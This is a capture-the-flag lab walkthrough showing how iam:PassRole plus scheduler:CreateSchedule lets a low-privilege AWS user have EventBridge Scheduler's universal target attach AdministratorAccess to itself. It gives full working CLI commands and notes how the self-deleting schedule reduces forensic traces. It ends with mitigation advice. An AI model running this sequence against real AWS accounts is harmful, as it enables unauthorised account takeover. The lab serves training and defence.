# Solution: PassRole + EventBridge Scheduler: Universal Target Privilege Escalation

EventBridge Scheduler introduced a feature called "universal targets" — schedule targets identified by ARNs of the form `arn:aws:scheduler:::aws-sdk:{service}:{action}`. Rather than routing work through a specific AWS service like Lambda or SQS, a universal target tells the Scheduler to invoke an arbitrary AWS SDK API action directly, using whatever IAM role you pass to it. This is extremely powerful for legitimate automation: instead of writing a Lambda function just to call `ec2:StopInstances` on a schedule, you can express it as a native Scheduler target.

That same power makes it a dangerous privilege escalation vector. An attacker who holds `iam:PassRole` on an admin role and `scheduler:CreateSchedule` can schedule a one-shot invocation of `iam:AttachUserPolicy` — targeting themselves — using the admin role as the executor. No Lambda function, no container, no EC2 instance. The Scheduler service itself becomes the AWS API proxy. Ninety seconds after the schedule is created it fires, the admin role attaches `AdministratorAccess` to the attacker's user, and the attacker can read the CTF flag with the same access key they started with.

This pattern mirrors the Step Functions SDK service integration path (`arn:aws:states:::aws-sdk:...`) but with a key operational difference: Scheduler executes asynchronously on a time trigger, and the schedule self-deletes via `--action-after-completion DELETE`, leaving a smaller forensic footprint than a standing Lambda function or persistent state machine. In real environments this technique appears when teams grant `scheduler:CreateSchedule` broadly for workflow automation without recognizing it as a PassRole vector.

## The Challenge

You have obtained credentials for `pl-prod-scheduler-001-to-admin-starting-user` — a low-privilege IAM user in the account. Your starting permissions are:

- `iam:PassRole` on `pl-prod-scheduler-001-to-admin-scheduler-role`
- `scheduler:CreateSchedule` on `*`

The target is full administrative access to this AWS account. There is an IAM role — `pl-prod-scheduler-001-to-admin-scheduler-role` — that holds `AdministratorAccess` and trusts `scheduler.amazonaws.com`. That trust relationship is what makes this scenario work.

Start by configuring your credentials and confirming your identity:

```bash
export AWS_ACCESS_KEY_ID=<starting_user_access_key_id>
export AWS_SECRET_ACCESS_KEY=<starting_user_secret_access_key>
unset AWS_SESSION_TOKEN

aws sts get-caller-identity
```

You should see yourself as `pl-prod-scheduler-001-to-admin-starting-user`. Confirm you don't have admin access yet:

```bash
aws iam list-users --max-items 1
# AccessDenied — you're locked out of admin operations
```

Good. Now let's change that.

## Reconnaissance

With the helpful permissions available, start by confirming the scheduler role exists and is configured as expected:

```bash
aws iam get-role --role-name pl-prod-scheduler-001-to-admin-scheduler-role \
  --query 'Role.[RoleName, AssumeRolePolicyDocument]' \
  --output json
```

You'll see a trust policy that allows `scheduler.amazonaws.com` to assume this role. That's the key detail — it means EventBridge Scheduler can act as this role when executing schedule targets. Check the role's attached policies to confirm it has admin-level access:

```bash
aws iam list-attached-role-policies \
  --role-name pl-prod-scheduler-001-to-admin-scheduler-role
```

`AdministratorAccess` will be listed. Now review any existing schedules to understand the environment:

```bash
aws scheduler list-schedules
```

The account likely has no pre-existing schedules. That means any schedule you create will be straightforward to identify in CloudTrail if someone is watching — though it will also self-delete after firing.

## Exploitation

The attack works by creating a one-shot EventBridge Scheduler schedule whose target is the universal target ARN `arn:aws:scheduler:::aws-sdk:iam:attachUserPolicy`. When the schedule fires, EventBridge Scheduler assumes the passed admin role and calls `iam:AttachUserPolicy` with the parameters you specify in the `Input` field.

First, compute a UTC timestamp 90 seconds in the future. This becomes the `at()` expression for the schedule:

```bash
SCHEDULE_TIME=$(python3 -c "
from datetime import datetime, timedelta, timezone
t = datetime.now(timezone.utc) + timedelta(seconds=90)
print(t.strftime('%Y-%m-%dT%H:%M:%S'))
")
echo "Schedule fires at: $SCHEDULE_TIME UTC"
```

Next, build the Input JSON — the parameters that will be passed to `iam:AttachUserPolicy`. This must be a serialized JSON string (not a nested object) because the Scheduler API expects `Input` to be a string:

```bash
SCHEDULE_INPUT=$(jq -cn \
  --arg user "pl-prod-scheduler-001-to-admin-starting-user" \
  --arg policy "arn:aws:iam::aws:policy/AdministratorAccess" \
  '{UserName: $user, PolicyArn: $policy}')
```

Now build the full Target JSON. The `Arn` is the universal target for `iam:AttachUserPolicy`, the `RoleArn` is the admin role you have PassRole on, and `Input` is the serialized parameter string from above:

```bash
TARGET_JSON=$(jq -cn \
  --arg arn "arn:aws:scheduler:::aws-sdk:iam:attachUserPolicy" \
  --arg role "arn:aws:iam::{account_id}:role/pl-prod-scheduler-001-to-admin-scheduler-role" \
  --arg input "$SCHEDULE_INPUT" \
  '{Arn: $arn, RoleArn: $role, Input: $input}')
```

Create the schedule. The `--flexible-time-window '{"Mode": "OFF"}'` flag disables the flexible window so it fires at exactly the specified time. `--action-after-completion DELETE` makes the schedule self-delete after firing:

```bash
aws scheduler create-schedule \
  --name pl-prod-scheduler-001-to-admin-privesc \
  --schedule-expression "at($SCHEDULE_TIME)" \
  --flexible-time-window '{"Mode": "OFF"}' \
  --target "$TARGET_JSON" \
  --action-after-completion DELETE
```

The API returns immediately with a schedule ARN. The actual `iam:AttachUserPolicy` call will happen when the schedule fires. Now wait — you need to give the schedule time to fire and then allow IAM policy propagation to complete:

```bash
echo "Waiting 120 seconds for schedule to fire and IAM to propagate..."
sleep 120
```

## Verification

After the wait, confirm that `AdministratorAccess` was attached to your user:

```bash
aws iam list-attached-user-policies \
  --user-name pl-prod-scheduler-001-to-admin-starting-user
```

You should see `AdministratorAccess` with policy ARN `arn:aws:iam::aws:policy/AdministratorAccess` in the output. Now test admin access with the same credentials you started with — no new access key required:

```bash
aws iam list-users --max-items 3 --output table
```

It works. You started with two narrow permissions and now have full administrative access to the account, without ever touching Lambda, EC2, ECS, or any execution environment.

If IAM propagation hasn't completed yet (rare but possible), wait an additional 20 seconds and retry:

```bash
sleep 20
aws iam list-users --max-items 1
```

## Capture the Flag

Every Pathfinding Labs scenario stores a flag in a predictable location in SSM Parameter Store. For this `to-admin` scenario, it lives at `/pathfinding-labs/flags/scheduler-001-to-admin`. Retrieving it requires `ssm:GetParameter`, which `AdministratorAccess` provides. Your existing access key now has that permission — no credential rotation needed.

```bash
aws ssm get-parameter \
  --name /pathfinding-labs/flags/scheduler-001-to-admin \
  --query 'Parameter.Value' \
  --output text
```

The value printed is the scenario flag. Its exact contents are deployment-specific. The retrieval mechanism is identical across all `to-admin` scenarios — only the scenario ID in the path changes.

## What Happened

You started with `iam:PassRole` and `scheduler:CreateSchedule` — a pair of permissions that looks innocuous in isolation. PassRole is routinely granted to let teams deploy workloads. CreateSchedule is granted to let automation trigger jobs on a schedule. Neither permission alone grants any elevated access.

The attack exploits EventBridge Scheduler's universal target feature. By pointing a schedule at `arn:aws:scheduler:::aws-sdk:iam:attachUserPolicy`, you turned the Scheduler service into an AWS API proxy that called an IAM write operation on your behalf — using an admin role you couldn't directly assume. The entire attack required a single `scheduler:CreateSchedule` API call, a 90-second wait, and the same credentials you started with.

In production environments, this vector appears when teams grant `scheduler:CreateSchedule` broadly for workflow orchestration without recognizing that it creates a PassRole privilege escalation path. The mitigation is straightforward: scope `iam:PassRole` with `iam:PassedToService` conditions so roles can only be passed to the services that actually need them, and avoid pairing `scheduler:CreateSchedule` with PassRole on privileged roles. IAM Access Analyzer's privilege escalation findings will surface this path automatically once the role and user are deployed.
